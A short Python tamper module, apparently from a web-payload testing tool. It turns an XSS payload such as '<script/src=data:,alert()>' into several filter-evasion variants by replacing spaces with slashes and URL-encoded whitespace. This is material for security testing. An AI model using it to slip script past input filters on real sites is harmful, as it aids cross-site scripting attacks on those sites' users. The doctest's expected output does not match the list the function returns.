from main_modules.settings import PRIORITY
__priority__ = PRIORITY.LOW


def tamper(payload, **kwargs):
    """
    <script/src=data:,alert()>

    >>> tamper("<script src=data:,alert()>")
    <script/src=data:,alert()>
    """
    result=[]
    result.append(payload.replace(' ', "/"))
    result.append(payload.replace(' ', "%09"))
    result.append(payload.replace(' ', "%0A"))
    result.append(payload.replace(' ', "%0C"))
    result.append(payload.replace(' ', "%0D"))
    result.append(payload.replace(' ', "%2F"))
    return result if payload else payload
